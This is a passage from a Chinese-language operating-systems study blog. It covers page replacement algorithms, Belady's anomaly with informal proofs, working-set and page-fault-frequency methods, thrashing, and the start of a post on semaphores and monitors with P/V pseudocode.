<h2 id="先进先出算法"><a href="#先进先出算法" class="headerlink" title="先进先出算法"></a>先进先出算法</h2><p><strong>先进先出算法（First-In First-Out, FIFO）</strong></p>
<p>选择在内存驻留时间最长的页面进行置换</p>
<p><strong>具体实现</strong></p>
<ul>
<li>维护一个记录所有位于内存中的逻辑页面链表</li>
<li>链表元素按驻留内存的时间排序，链首最长，链尾最短</li>
<li>出现缺页时，选择链首页面进行置换，新页面加到链尾</li>
</ul>
<p><strong>特征</strong></p>
<ul>
<li>实现简单</li>
<li>性能较差，调出的页面可能是经常访问的</li>
<li>进程分配物理页面数增加时，缺页并不一定减少(Belady现象)</li>
<li>很少单独使用，与其他算法结合</li>
</ul>
<p><img src="https://i.loli.net/2019/07/27/5d3c3149dd2c168338.png"></p>
<h2 id="最近最久未使用算法"><a href="#最近最久未使用算法" class="headerlink" title="最近最久未使用算法"></a>最近最久未使用算法</h2><p><strong>最近最久未使用算法 (Least Recently Used, LRU)</strong></p>
<p><strong>思路</strong> 考查过去而不是未来</p>
<ul>
<li><p>最优置换算法和先进先出算法的折衷</p>
</li>
<li><p>选择最长时间没有被引用的页面进行置换</p>
</li>
<li><p>如某些页面长时间未被访问，则它们在将来还可能会长时间不会访问</p>
</li>
</ul>
<p><strong>实现</strong></p>
<ul>
<li>缺页时，计算内存中每个逻辑页面的上一次访问时间</li>
<li>选择上一次使用到当前时间最长的页面</li>
</ul>
<p><strong>LRU算法的可能实现方法</strong></p>
<blockquote>
<p>页面链表</p>
</blockquote>
<ul>
<li>系统维护一个按最近一次访问时间排序的页面链表</li>
<li>链表首节点是最近刚刚使用过的页面</li>
<li>链表尾节点是最久未使用的页面</li>
<li>访问内存时，找到相应页面，并把它移到链表之首(落实到每一次访问)</li>
<li>缺页时，置换链表尾节点的页面</li>
</ul>
<blockquote>
<p>活动页面栈</p>
</blockquote>
<ul>
<li>访问页面时，将此页号压入栈顶，并栈内相同的页号抽出(完全搜索一遍，开销太大)</li>
<li>缺页时，置换栈底的页面</li>
</ul>
<blockquote>
<p>特征：开销比较大</p>
</blockquote>
<p><img src="https://i.loli.net/2019/07/27/5d3c3240b035667079.png"></p>
<h2 id="时钟置换算法"><a href="#时钟置换算法" class="headerlink" title="时钟置换算法"></a>时钟置换算法</h2><p><strong>时钟置换算法（Clock）</strong>仅对页面的访问情况进行大致统计，统计过去一段时间内访问特征，若访问过，则留下，若没有访问过，则按照先来后到的顺序进行置换。</p>
<p><strong>数据结构</strong></p>
<ul>
<li>在页表项中增加访问位，描述页面在过去一段时间的内访问情况</li>
<li>各页面组织成环形链表</li>
<li>指针指向最先调入的页面</li>
</ul>
<p><strong>算法</strong></p>
<ul>
<li>访问页面时，在页表项记录页面访问情况</li>
<li>缺页时，从指针处开始顺序查找未被访问的页面进行置换</li>
</ul>
<p><strong>特征</strong></p>
<p>时钟算法是LRU和FIFO的折中</p>
<p>既不像 LRU 考虑的那么详细，又不像 FIFO只在意一段时间内若不访问就做置换考虑的那么粗</p>
<p><strong>实现</strong></p>
<ul>
<li>页面装入内存时，访问位初始化为0</li>
<li>访问页面（读/写)时，访问位置1</li>
<li>缺页时，从指针当前位置顺序检查环形链表<ul>
<li>访问位为0，则置换该页</li>
<li>访问位为1，则访问位置0，并指针移动到下一个页面，直到找到可置换的页面</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/07/27/5d3c32dcc4b3254123.png"></p>
<p>需要特别注意的是：课件中的例子默认为热启动，所以链表的组织顺序为a-&gt;b-&gt;c-&gt;d-&gt;a，并不是按照之后的访问顺序来组织链表。每次页面置换后链表指针移至置换页的下一节点，若无页面置换则不移动链表指针。</p>
<h2 id="改进的时钟算法"><a href="#改进的时钟算法" class="headerlink" title="改进的时钟算法"></a>改进的时钟算法</h2><p>时钟置换算法中，若置换页被修改过，那么就得先将修改过的页写入到外存，再将需要的页读入内存，处理时间过长，引入改进的时钟算法对写的情况加以考虑从而减少修改页的缺页处理开销。系统定期将修改过的页回到外存中。</p>
<p><strong>算法</strong></p>
<ul>
<li>在页面中增加修改位，并在访问时进行相应修改</li>
<li>缺页时，修改页面标志位，以跳过有修改的页面</li>
</ul>
<p><img src="https://i.loli.net/2019/07/27/5d3c353229ee054785.png"></p>
<h2 id="最不常用算法"><a href="#最不常用算法" class="headerlink" title="最不常用算法"></a>最不常用算法</h2><p><strong>最不常用算法（Least Frequently Used, LFU）</strong>缺页时，置换访问次数最少的页面</p>
<p><strong>实现</strong></p>
<p>每个页面设置一个访问计数</p>
<p>访问页面时，访问计数加1</p>
<p>缺页时，置换计数最小的页面</p>
<p><strong>特征</strong></p>
<p>算法开销大</p>
<p>开始时频繁使用，但以后不使用的页面很难置换</p>
<ul>
<li>解决方法：计数定期右移</li>
</ul>
<p><strong>LRU和LFU的区别</strong></p>
<ul>
<li>LRU关注多久未访问,时间越短越好</li>
<li>LFU关注访问次数，次数越多越好</li>
</ul>
<h2 id="页面置换算法总结"><a href="#页面置换算法总结" class="headerlink" title="页面置换算法总结"></a>页面置换算法总结</h2><p>LRU 和 FIFO本质都是先进先出算法</p>
<table>
<thead>
<tr>
<th></th>
<th>排序标准</th>
<th>顺序</th>
<th>belady</th>
<th>开销</th>
</tr>
</thead>
<tbody><tr>
<td>LRU</td>
<td>最长时间没有被访问</td>
<td>需要动态地调整顺序</td>
<td>否</td>
<td>大</td>
</tr>
<tr>
<td>FIFO</td>
<td>在内存驻留时间最长</td>
<td>页面进入时间是固定不变的</td>
<td>是</td>
<td>小</td>
</tr>
</tbody></table>
<p>Clock算法是二者的折衷</p>
<ul>
<li><p>页面访问时，不动态调整页面在链表中的顺序，仅做标记</p>
</li>
<li><p>缺页时，再把它移动到链表末尾</p>
</li>
<li><p>对于未被访问的页面，即只访问一次，Clock和LRU算法的表现一样好，均退化为FIFO算法</p>
</li>
<li><p>对于被访问过的页面，Clock算法不能记录准确访问顺序，而LRU算法可以</p>
</li>
</ul>
<blockquote>
<p>LRU算法：</p>
</blockquote>
<p>排队依据：最近访问时间</p>
<p>访问时操作：将访问到的页面抽出并放到栈顶</p>
<p>缺页时操作：将栈底页面弹出，若该页面未被修改则无需操作，若被修改则将其写回内存。将需要装入内存的页放到栈顶</p>
<p>初始化操作：将初始的栈清空</p>
<blockquote>
<p>最优算法：</p>
</blockquote>
<p>排队依据：每个逻辑页面下一次访问时间</p>
<p>访问时操作：无</p>
<p>缺页时操作：计算下次访问时间，选择最长时间不访问的页面</p>
<p>初始化操作：依次将各个页面装入栈中</p>
<blockquote>
<p>LFU算法：（假设使用优先队列来维护）</p>
</blockquote>
<p>排队依据：访问次数。访问次数少的优先级更高。</p>
<p>访问时操作：给该页面的访问次数加1。优先队列需要相应地对该页面的位置做调整。又，如果考虑改进的LFU算法，访问次数的“加1”可能是模意义下的。</p>
<p>缺页时操作：将队首弹出。队首对应的页面计数应该清零。将新页面加入到优先队列中即可。</p>
<p>初始化操作：顺次地，每一个初始页面加入，并设访问次数为1即可。</p>
<blockquote>
<p>FIFO算法：（维护一个记录逻辑页面的链表）</p>
</blockquote>
<p>排队依据：页面加载时间</p>
<p>访问时操作：无</p>
<p>缺页时操作：将被访问页面对应的索引添加在链表尾。如果需要换出页面，则把链表头对应的页面换出，并把该节点从链表中移除</p>
<p>初始化操作：建立一个空的队列</p>
<blockquote>
<p>时钟置换算法</p>
</blockquote>
<p>排队依据：按照访问的计数（0/1）</p>
<p>访问时操作：修改访问位为1</p>
<p>缺页时操作：判断指针指向位置访问位是否为0，若为0，则置换该页，若为1，则修改为0，指针指向下一个直到找到一个访问位为0的页面</p>
<p>初始化操作：建立一个页面的环形列表，在页表项中增加访问位，初始化为0；环形链表的指针指向最先调入的页面。</p>
<h2 id="Belady现象"><a href="#Belady现象" class="headerlink" title="Belady现象"></a>Belady现象</h2><p>可能出现分配的物理页面数增加，但是缺页次数反而升高的异常现象</p>
<p><strong>原因</strong></p>
<ul>
<li>算法的置换特征与进程访问内存的动态特征矛盾</li>
<li>置换出去的页面并不一定是进程近期不会访问的页面</li>
</ul>
<p>下面哪些页面淘汰算法不会产生Belady异常现象 </p>
<ul>
<li><input disabled="" type="checkbox"> 先进先出页面置换算法（FIFO)</li>
<li><input disabled="" type="checkbox"> 时钟页面置换算法（CLOCK)</li>
<li><input checked="" disabled="" type="checkbox"> 最佳页面置换算法（OPT）</li>
<li><input checked="" disabled="" type="checkbox"> 最近最少使用页面置换算法（LRU）</li>
</ul>
<p>此处没有提及LFU算法，不恢复计数的LFU算法则可能存在Belady现象，而恢复计数的LFU算法不存在Belady现象。LFU是最近最不常用页面置换算法(Least Frequently Used),也就是淘汰一定时期内被访问次数最少的页。这里需要注意，当某页被换出后，其访问次数会被记录下来为n，当此页被再次访问，并被换入时，此页的访问次数为n+1。在这种定义下的LFU是没有Belady异常的。</p>
<p>当“不恢复上次换出时的访问计数”时LFU出现belady现象的例子：</p>
<p>考虑访存顺序：0 0 1 1 1 2 2 0 0 2 2 3 1 3 1 3 1 3 1 3 1 3 1 …</p>
<p>最后的序列是3号页和1号页的循环。</p>
<p>当物理页帧数为2时，之后的3和1循环段不会出现任何缺页</p>
<p>当物理页帧数为3时，之后的3和1循环段总是缺页</p>
<blockquote>
<p>clock算法的belady现象举例</p>
</blockquote>
<p>“虚拟页访问序列为 1,2,3,4,1,2,5,1,2,3,4,5，物理页帧数量为3和4”既能导致FIFO的belady现象，也能导致clock算法的belady现象。</p>
<blockquote>
<p>LRU算法不存在belady现象的证明</p>
</blockquote>
<p>最优置换和LRU算法都没有Belady异常。这两个都属于同一类算法，称为栈算法（stack algorithm），都绝不可能有Belady异常。栈算法可以证明为：对于帧数为n的内存页集合是对于帧数为n+1的内存页集合的子集。对于LRU算法，如果内存页的集合为最近引用的页，那么对于帧的增加，这n页仍然是最近引用的页，所以也仍然在内存中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">证明：</span><br><span class="line">        原理:因为小的物理页帧的栈包含于大数目的物理页帧的栈</span><br><span class="line">        下证s(t) 始终包含于 s&#39;(t)</span><br><span class="line">            利用归纳法，假设 1&lt;&#x3D;i&lt;&#x3D;t-1 时 s(i)包含于s&#39;(i)，现在要证s(t)依然包含于s&#39;(t)</span><br><span class="line">            (1) b(t)同时属于s(t)和s&#39;(t)：此时s(t)和s&#39;(t)都不发生变化，满足包含关系；</span><br><span class="line">            (2) b(t)不属于s(t),属于s&#39;(t)：s(t) 替换后，由于b(t)∈s(t)，所以s(t)包含于s&#39;(t)</span><br><span class="line">            (3) (1)和(2)很容易证明，</span><br><span class="line">                对于b(t)同时不属于s(t-1)和s&#39;(t-1)的情况，我们依然按照视频里栈的方式对s(t-1)和s&#39;(t-1)排序</span><br><span class="line">                由于s(t-1)包含于s&#39;(t-1),所以s(t-1)内每一个元素都存在于s&#39;(t-1)中。</span><br><span class="line">                现在两个栈都是按最后一次访问的时间的顺序来排列的，由于s(t)在进行替换时会替换s(t-1)里面最长时间没被访问的元素(栈底)，设为a,那么a显然也存在于s&#39;(t-1)里面，并且它不一定是s&#39;(t-1)的栈底。</span><br><span class="line">                    A. 当a是s&#39;(t-1)的栈底时，s(t)和s&#39;(t)替换的都是a, s(t) &#x3D; s(t-1) - &#123;a&#125; + &#123;b(t)&#125; , s&#39;(t) &#x3D; s&#39;(t-1) - &#123;a&#125; + &#123;b(t)&#125;</span><br><span class="line">                    B. 当a不是s&#39;(t-1)的栈底时，则s&#39;(t-1)的栈底c必然不属于s(t-1)，否则就会与a是s(t-1)的栈底矛盾（即c比a有更长的时间未被访问），此种情况下s(t)和s&#39;(t)依然满足包含关系</span><br><span class="line">            (4) 由归纳假设可以得知此种情况不存在</span><br></pre></td></tr></table></figure>
<blockquote>
<p>恢复计数的LFU算法不会出现Belady现象的证明</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先对恢复计数的LFU算法进行一种感性认识：考虑这样一个大小为n的栈S，它能够实时维护当前内存中存在的所有页面，并总能保持从栈顶到栈底存放的页面的访问次数是递减的。那么，需要置换的时候，被换出去的总是当前存在栈底的页面。又，在恢复计数的条件下，各个页面按计数多少排出的顺序总是一致的，且与系统分配的页面个数没有关系。事实上，考虑分配了无穷多个页面的情况：这时，相应的栈S∞总不会有页面被置换出来，那么总有S⊂S∞（这种包含关系是序列的包含）。我们认识到，页面的计数与栈的容量无关。</span><br><span class="line">下面来进行证明。设t时刻下大小为n的栈的内容为有序集S(t)，大小为n+k的栈的内容为有序集S′(t)，其中k&gt;0；又，B(t)为新入栈的元素。</span><br><span class="line"></span><br><span class="line">只需证明，对于任意t，S(t)⊂S′(t)，且任意S(t)中元素a，对应到S′(t)中元素a′，满足a的位置小于等于a′的栈位置，即可证明物理页面数量增加的缺页率不会降低。</span><br><span class="line">使用数学归纳法。</span><br><span class="line"></span><br><span class="line">基础：在初始情况下，S(0)与S′(0)都为空，满足任意S(0)中元素a，对应到S′(0)中元素a′。</span><br><span class="line"></span><br><span class="line">归纳：假设在t−1时刻满足S(t−1)⊂S′(t−1)，且任意S(t−1)中元素a，对应到S′(t−1)中元素a′，满足a的位置小于等于a′的栈位置。则在t时刻，对于B(t)页的页面访问请求，可能出现以下三种情况：</span><br><span class="line">1. B(t)∈S(t) 且 B(t)∈S′(t)。记B(t)在S(t)中的位置是b，在S′(t)中的位置是b′，则b≤b′。经过访问后，要给两个占中的该页面计数各加一。若B(t)在S(t)中上移超过了Δb个页面，则由于这Δb个页面均有序地存在于S′(t−1)中，故B(t)在S′(t)中至少也上移了Δb。这样，b+Δb≤b′+Δb，性质仍保持；</span><br><span class="line">2. B(t)∉S(t) 且 B(t)∈S′(t)。这时将B(t)页面重新加入到S中。假设B(t)最终落在S(t)的位置b上，也就是说B(t)的计数超过了S(t−1)中的低b个；由于S(t−1)⊂S′(t−1)，那么S(t−1)中的低b个也依次存在于S′(t−1)中。由于页面的计数与栈的容量无关，我们知道S′中B(t)下面至少有这低b个页面，故其落在的位置一定大于等于b。</span><br><span class="line">3. B(t)∉S(t) 且 B(t)∉S′(t)。这时将B(t)页面重新加入到S和S′中。假设B(t)最终落在S(t)的位置b上，也就是说B(t)的计数超过了S(t−1)中的低b个；由于页面的计数与栈的容量无关，且S(t−1)中的低b个页面也属于S′(t−1)中，对应在S′中的位置至少是低b个。那么，B(t)的计数也一定超过了S′(t−1)中的低b个，最终落在落在S′(t)的位置一定大于等于b。</span><br><span class="line">由于假设的存在，S(t)⊂S′(t)，即不会出现B(t)∈S(t) 且 B(t)∉S′(t)的情况。</span><br><span class="line">综上所述，由数学归纳法得，对任意时刻t，S(t)⊂S′(t)，且任意S(t)中元素a，对应到S′(t)中元素a′，满足a的位置小于等于a′的栈位置。</span><br><span class="line">即对任意时刻，对S′(t)的缺页数量不会大于S(t)；物理页数量增加，缺页率不会上升。</span><br><span class="line">因此，恢复计数的LFU算法不会出现Belady现象。</span><br></pre></td></tr></table></figure>
<blockquote>
<p>OPT算法不会出现Belady现象的证明</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">设帧数为n时，内存中逻辑页面的集合为S(n)，可以证明在任意时间 S(n)⊆S(n+1)</span><br><span class="line">设L(n)表示将S(n)中元素按将来访问时间排序从大到小排序的结果。</span><br><span class="line">在访问序列中，按第一次出现的顺序，将逻辑页面编号为1, 2, 3, ...（如访问顺序为1, 2, 1, 3, 2, 4...)，并令tk表示编号为k的页面第一次出现的时间</span><br><span class="line">假设：每一个时间点 t，都有 S(n)⊆S(n+1)。</span><br><span class="line">证明如下：</span><br><span class="line">t &#x3D; 0 时，S(n) &#x3D; S(n+1) &#x3D; ∅，满足假设</span><br><span class="line">t&lt;tn+1时，此时S(n)和S(n+1)的物理帧还没满，所以发生缺页时都会填入新页</span><br><span class="line">tk−1&lt;t&lt;tk,k≤n+1，访问的页面编号不超过k - 1，而这些页面在之前已经被加载，所以不发生页缺失，S(n) &#x3D; S(n+1) &#x3D; &#123;1, 2, ..., k-1&#125;，满足假设</span><br><span class="line">t&#x3D;tk,k≤n，第一次访问编号k的页面，同时发生缺失，之后S(n)  &#x3D; S(n+1) &#x3D; &#123;1, 2, ..., k&#125;, 满足假设</span><br><span class="line">t&#x3D;tn+1时</span><br><span class="line">此时，S(n)和S(n+1)同时发生缺页，S(n)换出一页再换入编号为n+1的页，而S(n+1)直接加载编号为n+1的页，所以S(n)⊆S(n+1)。</span><br><span class="line">t&gt;tn+1时，S(n)和S(n+1)的物理内存都已经满了，可用归纳法证明上述假设</span><br><span class="line">初始状态 t&#x3D;tn+1时，满足假设（见3）</span><br><span class="line">假设t &#x3D; m 时有S(n)⊆S(n+1)，则当t &#x3D; m + 1时</span><br><span class="line">如果S(n)和S(n+1)都访问正常，则S(n)和S(n+1)都不发生变化。</span><br><span class="line">如果S(n)访问异常，S(n+1)访问正常，设访问前S(n+1)&#x3D;S(n)∪&#123;x&#125;，那么易知此时访问的是x，所以S(n)换出一页再换入x后，仍然满足S(n)⊆S(n+1)</span><br><span class="line">如果S(n)和S(n+1)均访问异常，设访问前S(n)&#x3D;&#123;s1,s2,...,sn&#125;, S(n+1)&#x3D;&#123;s1,s2,...,sn,x&#125;，将两者中元素按未来访问时间从大到小排序，可得到L(n)为&#123;s′1,s′2,...,s′n−1,s′n&#125;, L(n+1)为&#123;s′1,s′2,...,s′i,x,s′i+1,...,s′n&#125;</span><br><span class="line">如果x&lt;s′n，则S(n)换出s&#39;n, S(n+1)换出x, 再同时换入新页，依然满足S(n)⊆S(n+1)</span><br><span class="line">如果x&gt;s′n, 则S(n)和S(n+1)同时换出s′n换入新页，所以满足S(n)⊆S(n+1)</span><br><span class="line">综上所述，可以证得。</span><br><span class="line"></span><br><span class="line">所以易证不会出现Belady现象</span><br></pre></td></tr></table></figure>
<h1 id="全局置换算法"><a href="#全局置换算法" class="headerlink" title="全局置换算法"></a>全局置换算法</h1><p>局部页面置换算法没有考虑到进程访存的差异，在不同阶段进程需求不同。局部页面置换算法分配页面数始终一致无法适应需求，在某些情况下增加页面会大大减小缺页次数。因此，引入全局置换算法，为进程分配可变数目的物理页面。</p>
<p><strong>全局页面置换算法需要解决的问题</strong></p>
<ul>
<li>进程在不同阶段的内存需求是变化的</li>
<li>分配给进程的内存也需要在不同阶段有所变化</li>
<li>全局置换算法需要确定分配给进程的物理页面数</li>
</ul>
<h2 id="工作集算法"><a href="#工作集算法" class="headerlink" title="工作集算法"></a>工作集算法</h2><p><strong>CPU利用率与并发进程数的关系</strong></p>
<p>进程数少时，CPU利用率与并发进程数会相互促进；</p>
<p>进程数较多导致局部性降低时，CPU利用率与并发进程数会相互制约；</p>
<p><strong>工作集</strong></p>
<p>工作集：当前进程正在使用的逻辑页面的集合；即当前一段时间t内进程访问的所有逻辑页面的集合。</p>
<p>工作集的变化规律：</p>
<p><strong>进程开始执行时</strong>  随着访问新页面逐步建立较稳定的工作集。</p>
<p><strong>工作集稳定期</strong> 当内存访问的局部性区域的位置大致稳定时，工作集大小也大致稳定</p>
<p><strong>工作集过渡期</strong> 局部性区域的位置改变时，工作集快速扩张和收缩过渡到下一个稳定值</p>
<p><strong>常驻集</strong></p>
<p>当前时刻进程实际驻留内存的页面集合</p>
<ul>
<li>工作集和常驻集的关系<ul>
<li>工作集是进程运行过程中固有的性质 (进程在一段时间访问的页面集合)</li>
<li>常驻集取决于系统分配给进程的物理页面数和页面置换算法 </li>
</ul>
</li>
<li>缺页率和常驻集的关系<ul>
<li>常驻集包含工作集时缺页较少 (进程访问的页都在内存中)</li>
<li>工作集发生剧烈过渡时，缺页较多</li>
<li>进程常驻集大小达到一定数目后，缺页率不会明显下降 </li>
</ul>
</li>
</ul>
<p><strong>工作集置换算法</strong></p>
<p>换出不在工作集中的页面(并不一定在缺页时执行)</p>
<ul>
<li>窗口大小τ：当前时刻前τ个内存访问的页引用是工作集，​τ​被称为窗口大小</li>
<li>实现方法：<ul>
<li>访存链表：维护窗口内的访存页面链表</li>
<li>访存时，换出不在工作集的页面；更新访存链表</li>
<li>缺页时，换入页面；更新访存链表</li>
</ul>
</li>
</ul>
<h2 id="缺页率算法"><a href="#缺页率算法" class="headerlink" title="缺页率算法"></a>缺页率算法</h2><p><strong>缺页率(page fault rate)</strong></p>
<p>缺页次数 / 内存访问次数 或 缺页平均时间间隔的倒数</p>
<p><strong>缺页率置换算法（PFF, Page-Fault-Frequency）</strong></p>
<ul>
<li>通过调节常驻集大小，使每个进程的缺页率保持在一个合理的范围内</li>
<li>若进程缺页率过高，则增加常驻集以分配更多的物理页面</li>
<li>若进程缺页率过低，则减少常驻集以减少它的物理页面数</li>
</ul>
<p><strong>实现</strong></p>
<ul>
<li>缺页时 计算从上次缺页时间$t_{last}$ 到现在$t_{current}$ 的时间间隔<ul>
<li>如果$t_{current} - t_{last} &gt; T$ 缺页率低于设定值,则置换所有在$[t_last, t_current]$中没有被引用的页</li>
<li>如果$t_{current} - t_{last} &lt;= T$ 缺页率高于设定值,则增加缺失页到常驻集中</li>
</ul>
</li>
</ul>
<h1 id="抖动问题"><a href="#抖动问题" class="headerlink" title="抖动问题"></a>抖动问题</h1><p>由于分配给进程的物理页面太少无法包含工作集导致大量缺页而频繁置换，从而进程运行速度变慢。</p>
<p><strong>原因</strong></p>
<p> 随着驻留内存的进程数目增加，分配给每个进程的物理页面数不断减小，缺页率不断上升。</p>
<p>通过调节并发进程数来进行系统负载控制。</p>
<p>最佳状态是：平均缺页间隔 = 缺页异常处理时间。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>信号量</title>
    <url>/systems/semaphore/</url>
    <content><![CDATA[<p>在之前我们讨论了并发问题，多线程并发导致资源竞争，可能会引发意想不到的错误所以引入同步来协调多线程对共享数据的访问，任何时刻只能由一个线程执行临界区代码。确保同步正确可以通过底层硬件支持，也可以通过高层次抽象。高层次抽象中比较典型的两种则为信号量和管程。</p>
<a id="more"></a>

<h1 id="基本同步方法"><a href="#基本同步方法" class="headerlink" title="基本同步方法"></a>基本同步方法</h1><p><img src="https://i.loli.net/2019/07/29/5d3e3ee87632a83741.png"></p>
<blockquote>
<p>自旋锁为什么无法按先来先服务方式使用资源？</p>
</blockquote>
<p>原因：自旋锁是由TS指令实现的临界区申请操作，第一个检测到临界区空闲的申请者而不是第一个开始检测的申请者进入。也就是说，访问顺序是由硬件随机决定的。如果要实现FIFO方式，一般都需要一个队列。</p>
<h1 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h1><p>信号量是操作系统提供的一种协调共享资源访问的方法</p>
<ul>
<li>软件同步是平等线程间的一种同步协商机制</li>
<li>OS是管理者，由操作系统仲裁谁来使用资源，地位高于进程</li>
<li>用信号量来表示系统资源的数量</li>
</ul>
<blockquote>
<p>信号量与软件同步区别</p>
</blockquote>
<p>软件同步是平等线程间的一种同步协商机制；</p>
<p>信号量是由地位高于进程的管理者OS协调的同步机制</p>
<h2 id="信号量组成"><a href="#信号量组成" class="headerlink" title="信号量组成"></a>信号量组成</h2><p>由一个整形（sem）变量和两个原子操作组成</p>
<p><code>P()</code>：sem减1</p>
<ul>
<li>若sem &lt; 0, 进入等待，否则继续</li>
</ul>
<p><code>V()</code>：sem加1</p>
<ul>
<li>sem &lt;= 0，唤醒一个等待进程</li>
</ul>
<h2 id="信号量的特性"><a href="#信号量的特性" class="headerlink" title="信号量的特性"></a>信号量的特性</h2><p>信号量是被保护的整数变量</p>
<ul>
<li>初始化完成后，只能通过<code>P()</code>和<code>V()</code> 操作修改</li>
<li>由操作系统保证PV操作是原子操作</li>
<li>P() 可能阻塞(没有资源，处于等待状态)</li>
<li>V() 不会阻塞(释放资源，唤醒等待状态的进程)</li>
</ul>
<p>通常假定信号量是公平的</p>
<ul>
<li>线程不会被无限期阻塞在 P() 操作（实际系统中有一个最长时限的参数，超时之后错误返回）</li>
<li>假定信号量等待先进先出（但是在实际系统中公平有所偏差）</li>
</ul>
<p><strong>信号量的实现</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Semaphore &#123;</span><br><span class="line">    int sem;</span><br><span class="line">    WaitQueue q;</span><br><span class="line">&#125;</span><br><span class="line">Semaphore::P() &#123;</span><br><span class="line">   sem--;</span><br><span class="line">   if (sem &lt; 0) &#123;</span><br><span class="line">        Add this thread t to q;</span><br><span class="line">        block(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Semaphore::V() &#123;</span><br><span class="line">    sem++; </span><br><span class="line">    if (sem &lt;&#x3D; 0) &#123;</span><br><span class="line">        Remove a thread t from q;</span><br><span class="line">        wakeup(t);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若将程序修改为以下形式，即互换P操作的sem修改与sem条件判断的顺序，则无法确保互斥访问。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P()&#123; </span><br><span class="line">    <span class="keyword">if</span> (sem &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        q. enqueue(t);</span><br><span class="line">        block(t);</span><br><span class="line">    &#125;</span><br><span class="line">    sem--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">V() &#123;</span><br><span class="line">    sem++;</span><br><span class="line">    <span class="keyword">if</span> (!q.empty()) &#123;</span><br><span class="line">        t = q.dequeue();</span><br><span class="line">        wakeup(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比如，一个例子：以下以Pn表示进程n执行P操作，Vn表示进程n执行V操作</p>
<p>P1,sem=0,q=[]，1进入临界区</p>
<p>P2,sem=0,q=[2]，2被阻塞，不能执行sem–</p>
<p>V1,sem=1,q=[]，2被唤醒，此时2处于就绪态，当进程调度时，如果没有马上调度2，比如调度了3，执行P3，3发现sem=1，于是直接跳到sem–并且进入临界区；而3在临界区的过程中，若发生进程切换，切到2时，2执行sem–，sem=-1，并且2也进入临界区。这就导致会有多个进程进入临界区的情况。因此这种做法是不可取的。</p>
<p>若将if修改为while则可解决互斥访问的问题，但是无法保证按照FIFO方式申请信号量。</p>
<ul>
<li>一个线程A调用P()原语时，由于线程B正在使用该信号量而进入阻塞状态；注意，这时value的值为0。</li>
<li>线程B放弃信号量的使用，线程A被唤醒而进入就绪状态，但没有立即进入运行状态；注意，这里value为1。<br>在线程A处于就绪状态时，处理机正在执行线程C的代码；线程C这时也正好调用P()原语访问同一个信号量，并得到使用权。注意，这时value又变回0。</li>
<li>线程A进入运行状态后，重新检查value的值，条件不成立，又一次进入阻塞状态。</li>
<li>至此，线程C比线程A后调用P原语，但线程C比线程A先得到信号量。</li>
</ul>
<h2 id="信号量的分类"><a href="#信号量的分类" class="headerlink" title="信号量的分类"></a>信号量的分类</h2><ul>
<li>二进制信号量，资源数目为 0 或 1</li>
<li>资源信号量，可为任何非负值</li>
</ul>
<p>两者等价，基于一个可以实现另一个</p>
<h2 id="信号量的使用"><a href="#信号量的使用" class="headerlink" title="信号量的使用"></a>信号量的使用</h2><p>互斥访问</p>
<ul>
<li>临界区的互斥访问控制</li>
</ul>
<p>条件同步</p>
<ul>
<li>线程间事件等待</li>
</ul>
<h2 id="互斥访问"><a href="#互斥访问" class="headerlink" title="互斥访问"></a>互斥访问</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mutex &#x3D; new Semaphore(1);</span><br></pre></td></tr></table></figure>
<p>每类资源设置一个信号量，初值为 1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mutex-&gt;P();</span><br><span class="line">Critical Section;</span><br><span class="line">mutex-&gt;V();</span><br></pre></td></tr></table></figure>
<p>必须成对使用 <code>P()</code> 和 <code>V()</code> 操作</p>
<p>不申请直接释放，多个线程进入缓冲区</p>
<p>申请不释放，缓冲区无线程，但谁也进不去</p>
<ul>
<li><code>P()</code> 保证互斥访问临界资源</li>
<li><code>V()</code> 在使用后释放临界资源</li>
<li>PV操作不能次序错误、重复 、遗漏</li>
</ul>
<h2 id="条件同步"><a href="#条件同步" class="headerlink" title="条件同步"></a>条件同步</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">condition &#x3D; new Semaphore(0);</span><br></pre></td></tr></table></figure>
<p>条件同步设置一个信号量，初值为 0</p>
<p><img src="https://i.loli.net/2019/07/29/5d3e43870555679689.png"></p>
<p>线程a执行P操作后信号量为负值，进入等待状态，线程B执行V操作后，信号量又回到0，此时线程a可以继续往下执行，通过这种方式实现条件同步。</p>
<blockquote>
<p>什么是信号量？它与软件同步方法的区别在什么地方？</p>
</blockquote>
<p>信号量是由操作系统提供的一种协调共享资源访问的方法。信号量是一种抽象数据类，由一个被保护的整形变量（sem）和P()、V()两个原子操作组成，表示系统资源的数量。</p>
<p>区别：</p>
<ul>
<li>软件同步是平等线程间的一种同步协商机制；</li>
<li>信号量是由地位高于进程的管理者OS协调的同步机制。</li>
</ul>
<h1 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h1><p>用于多线程互斥访问共享资源的程序结构</p>
<ul>
<li>采用面向对象方法，简化了线程间的同步控制</li>
<li>任一时刻最多只有一个线程执行管程代码</li>
<li>正在管程中的线程可临时放弃管程的互斥访问，等待事件出现时恢复</li>
</ul>
<blockquote>
<p>管程与临界区有什么异同？</p>
</blockquote>
<p>相同点：在任一时刻最多只有一个线程执行管程代码或临界区代码；</p>
<p>不同：正在管程中的线程可临时放弃管程的互斥访问，等待事件出现时恢复；而临界区不支持临时退出；</p>
<p><strong>管程的使用</strong></p>
<ul>
<li>在对象/模块中收集相关共享数据</li>
<li>定义访问共享数据的方法</li>
</ul>
